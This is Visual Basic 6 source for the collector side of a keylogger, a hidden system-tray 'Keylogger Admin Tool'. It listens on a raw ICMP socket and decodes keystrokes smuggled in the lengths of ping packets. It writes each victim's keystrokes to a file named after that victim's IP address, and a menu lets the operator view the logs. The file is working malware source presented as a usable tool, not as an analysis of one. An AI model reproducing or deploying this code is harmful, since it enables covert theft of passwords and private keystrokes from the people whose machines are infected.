VERSION 5.00
Begin VB.Form KeyLogger_Admin 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Keylogger Admin Tool"
   ClientHeight    =   375
   ClientLeft      =   150
   ClientTop       =   825
   ClientWidth     =   2595
   Icon            =   "KeyLog_Server.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   25
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   173
   StartUpPosition =   2  'CenterScreen
   Begin VB.Menu mnuFile 
      Caption         =   "File"
      Begin VB.Menu mnuVIEWLOGS 
         Caption         =   "View KeyLog Files"
      End
      Begin VB.Menu spacerA 
         Caption         =   "-"
      End
      Begin VB.Menu mnuEXIT 
         Caption         =   "Exit"
      End
   End
End
Attribute VB_Name = "KeyLogger_Admin"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private ProtocolBuilder         As clsProtocolInterface
Private WithEvents ICMPDriver   As clsICMPProtocol
Attribute ICMPDriver.VB_VarHelpID = -1

Const SOCKET_ERROR = 0
Private Const MAX_WSADescription As Long = 256
Private Const MAX_WSASYSStatus As Long = 128
Private Const MAX_PATH  As Long = 260
Private Const WS_VERSION_REQD As Long = &H101
Private Const NIM_ADD = &H0
Private Const NIM_DELETE = &H2
Private Const NIF_MESSAGE = &H1
Private Const NIF_ICON = &H2
Private Const NIF_TIP = &H4
Private Const WM_MOUSEMOVE = &H200
Private Const WM_LBUTTONDOWN = &H201
Private Const WM_RBUTTONDOWN = &H204

Private Type NOTIFYICONDATA
    cbSize As Long
    hwnd As Long
    uId As Long
    uFlags As Long
    uCallBackMessage As Long
    hIcon As Long
    szTip As String * 64
End Type

Private Type OPENFILENAME
    lStructSize As Long
    hwndOwner As Long
    hInstance As Long
    lpstrFilter As String
    lpstrCustomFilter As String
    nMaxCustFilter As Long
    nFilterIndex As Long
    lpstrFile As String
    nMaxFile As Long
    lpstrFileTitle As String
    nMaxFileTitle As Long
    lpstrInitialDir As String
    lpstrTitle As String
    flags As Long
    nFileOffset As Integer
    nFileExtension As Integer
    lpstrDefExt As String
    lCustData As Long
    lpfnHook As Long
    lpTemplateName As String
End Type

Private Declare Function Shell_NotifyIcon Lib "shell32" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, pnid As NOTIFYICONDATA) As Boolean
Private Declare Function SetForegroundWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetOpenFileName Lib "comdlg32.dll" Alias "GetOpenFileNameA" (pOpenfilename As OPENFILENAME) As Long

Private nid As NOTIFYICONDATA
Dim LOCALIP As String
Dim APPPATH As String
Dim SHUTDOWN As Integer

Private Sub Form_Load()

    Me.Hide
    If App.PrevInstance Then
        End
        Exit Sub
    End If
    With nid
        .cbSize = Len(nid)
        .hwnd = Me.hwnd
        .uId = vbNull
        .uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE
        .uCallBackMessage = WM_MOUSEMOVE
        .hIcon = Me.Icon
        .szTip = "KeyLogger Admin Tool" & vbNullChar
    End With
    APPPATH = App.Path
    If Right(APPPATH, 1) = "\" Then APPPATH = Left(APPPATH, Len(APPPATH) - 1)
    Shell_NotifyIcon NIM_ADD, nid
    Dim str() As String, i As Integer
    Set ProtocolBuilder = New clsProtocolInterface
    Set ICMPDriver = New clsICMPProtocol
    ProtocolBuilder.AddinProtocol ICMPDriver, "ICMP", IPPROTO_ICMP
    str = Split(EnumNetworkInterfaces(), ";")
    If str(0) <> "127.0.0.1" Then
        LOCALIP = str(0)
        If ProtocolBuilder.CreateRawSocket(LOCALIP, 7000, Me.hwnd) <> 0 Then
        End If
    End If

End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, x As Single, Y As Single)

    Dim Result, Action As Long
    If Me.ScaleMode = vbPixels Then
        Action = x
    Else
        Action = x / Screen.TwipsPerPixelX
    End If
    Select Case Action
    Case WM_RBUTTONDOWN
        Result = SetForegroundWindow(Me.hwnd)
        PopupMenu mnuFile
    Case WM_LBUTTONDOWN
         Result = SetForegroundWindow(Me.hwnd)
         PopupMenu mnuFile
    End Select

End Sub

Private Sub Form_Unload(Cancel As Integer)

    If SHUTDOWN = 1 Then
        Shell_NotifyIcon &H2, nid
        ProtocolBuilder.CloseRawSocket
        Set ProtocolBuilder = Nothing
        Set ICMPDriver = Nothing
        End
    Else
        Cancel = 1
        Me.Visible = False
    End If
    
End Sub


Private Sub ICMPDriver_RecievedPacket(IPHeader As clsIPHeader, ICMPProtocol As clsICMPProtocol)
    
    If IPHeader.SourceIP = LOCALIP Then Exit Sub
    If ICMPProtocol.GetICMPTypeStr = "Echo Reply" Then Exit Sub
    Dim IP As String
    IP = IPHeader.SourceIP
    Dim msgchar As String
    Dim msglen As Integer
    Dim iFileNo As Integer
    msglen = IPHeader.PacketLength - 28
    If msglen >= 28 And msglen <= 123 Then
        msgchar = Convert2Char(msglen)
        Dim FileName As String
        FileName = APPPATH + "\" + IP + ".keylog"
        Dim sFileText As String
        DoEvents
        If FileExistsA(FileName) Then
            iFileNo = FreeFile
            Open FileName For Input As #iFileNo
                Do While Not EOF(iFileNo)
                    Input #iFileNo, sFileText
                Loop
            Close #iFileNo
        Else
            If FileExistsB(FileName) Then
                iFileNo = FreeFile
                Open FileName For Input As #iFileNo
                    Do While Not EOF(iFileNo)
                        Input #iFileNo, sFileText
                    Loop
                Close #iFileNo
            End If
        End If
        DoEvents
        If msgchar = Chr(13) Then msgchar = vbNewLine
        iFileNo = FreeFile
        Open FileName For Output As #iFileNo
            Write #iFileNo, sFileText + msgchar
        Close #iFileNo
    End If
    
End Sub

Private Sub mnuEXIT_Click()

    SHUTDOWN = 1
    Unload Me
    
End Sub

Private Sub mnuVIEWLOGS_Click()

    ChDir App.Path
    Dim OFName As OPENFILENAME
    OFName.lStructSize = Len(OFName)
    OFName.hwndOwner = Me.hwnd
    OFName.hInstance = App.hInstance
    OFName.lpstrFilter = "Keystroke Log Files (*.keylog)" + Chr$(0) + "*.keylog" + Chr$(0)
    OFName.lpstrFile = Space$(254)
    OFName.nMaxFile = 255
    OFName.lpstrFileTitle = Space$(254)
    OFName.nMaxFileTitle = 255
    OFName.lpstrInitialDir = App.Path & "\"
    OFName.lpstrTitle = "Select Keystroke Log File"
    OFName.flags = 0
    If GetOpenFileName(OFName) Then
        Call Shell("Notepad.exe " + Trim$(OFName.lpstrFile), vbMaximizedFocus)
    End If

End Sub


Public Function Convert2Char(msgID As Integer) As String

    Dim templetter As String
    If msgID = 28 Then templetter = "e"
    If msgID = 29 Then templetter = "t"
    If msgID = 30 Then templetter = "a"
    If msgID = 31 Then templetter = "o"
    If msgID = 32 Then templetter = "i"
    If msgID = 33 Then templetter = "n"
    If msgID = 34 Then templetter = "s"
    If msgID = 35 Then templetter = "r"
    If msgID = 36 Then templetter = "h"
    If msgID = 37 Then templetter = "l"
    If msgID = 38 Then templetter = "d"
    If msgID = 39 Then templetter = "c"
    If msgID = 40 Then templetter = "u"
    If msgID = 41 Then templetter = "m"
    If msgID = 42 Then templetter = "f"
    If msgID = 43 Then templetter = "p"
    If msgID = 44 Then templetter = "g"
    If msgID = 45 Then templetter = "w"
    If msgID = 46 Then templetter = "y"
    If msgID = 47 Then templetter = "b"
    If msgID = 48 Then templetter = "v"
    If msgID = 49 Then templetter = "k"
    If msgID = 50 Then templetter = "x"
    If msgID = 51 Then templetter = "j"
    If msgID = 52 Then templetter = "q"
    If msgID = 53 Then templetter = "z"
    If msgID = 54 Then templetter = "E"
    If msgID = 55 Then templetter = "T"
    If msgID = 56 Then templetter = "A"
    If msgID = 57 Then templetter = "O"
    If msgID = 58 Then templetter = "I"
    If msgID = 59 Then templetter = "N"
    If msgID = 60 Then templetter = "S"
    If msgID = 61 Then templetter = "R"
    If msgID = 62 Then templetter = "H"
    If msgID = 63 Then templetter = "L"
    If msgID = 64 Then templetter = "D"
    If msgID = 65 Then templetter = "C"
    If msgID = 66 Then templetter = "U"
    If msgID = 67 Then templetter = "M"
    If msgID = 68 Then templetter = "F"
    If msgID = 69 Then templetter = "P"
    If msgID = 70 Then templetter = "G"
    If msgID = 71 Then templetter = "W"
    If msgID = 72 Then templetter = "Y"
    If msgID = 73 Then templetter = "B"
    If msgID = 74 Then templetter = "V"
    If msgID = 75 Then templetter = "K"
    If msgID = 76 Then templetter = "X"
    If msgID = 77 Then templetter = "J"
    If msgID = 78 Then templetter = "Q"
    If msgID = 79 Then templetter = "Z"
    If msgID = 80 Then templetter = "1"
    If msgID = 81 Then templetter = "2"
    If msgID = 82 Then templetter = "3"
    If msgID = 83 Then templetter = "4"
    If msgID = 84 Then templetter = "5"
    If msgID = 85 Then templetter = "6"
    If msgID = 86 Then templetter = "7"
    If msgID = 87 Then templetter = "8"
    If msgID = 88 Then templetter = "9"
    If msgID = 89 Then templetter = "0"
    If msgID = 90 Then templetter = "!"
    If msgID = 91 Then templetter = "@"
    If msgID = 92 Then templetter = "#"
    If msgID = 93 Then templetter = "$"
    If msgID = 94 Then templetter = "%"
    If msgID = 95 Then templetter = "^"
    If msgID = 96 Then templetter = "&"
    If msgID = 97 Then templetter = "*"
    If msgID = 98 Then templetter = "("
    If msgID = 99 Then templetter = ")"
    If msgID = 100 Then templetter = "-"
    If msgID = 101 Then templetter = "="
    If msgID = 102 Then templetter = "_"
    If msgID = 103 Then templetter = "+"
    If msgID = 104 Then templetter = "`"
    If msgID = 105 Then templetter = "~"
    If msgID = 106 Then templetter = "["
    If msgID = 107 Then templetter = "{"
    If msgID = 108 Then templetter = "]"
    If msgID = 109 Then templetter = "}"
    If msgID = 110 Then templetter = "|"
    If msgID = 111 Then templetter = "\"
    If msgID = 112 Then templetter = ";"
    If msgID = 113 Then templetter = ":"
    If msgID = 114 Then templetter = "'"
    If msgID = 115 Then templetter = Chr(34)
    If msgID = 116 Then templetter = ","
    If msgID = 117 Then templetter = "<"
    If msgID = 118 Then templetter = "."
    If msgID = 119 Then templetter = ">"
    If msgID = 120 Then templetter = "/"
    If msgID = 121 Then templetter = "?"
    If msgID = 122 Then templetter = Chr(13)
    If msgID = 123 Then templetter = " "
    Convert2Char = templetter
    
End Function

Private Function FileExistsA(FullFileName As String) As Boolean

    If Dir$(FullFileName) <> "" Then
        FileExistsA = True
    Else
        FileExistsA = False
    End If

End Function

Private Function FileExistsB(FullFileName As String) As Boolean

    On Error GoTo MakeF
        Dim NextFile As Integer
        NextFile = FreeFile
        Open FullFileName For Input As #NextFile
        Close #NextFile
        FileExistsB = True
    Exit Function
MakeF:
        FileExistsB = False
    Exit Function
    
End Function

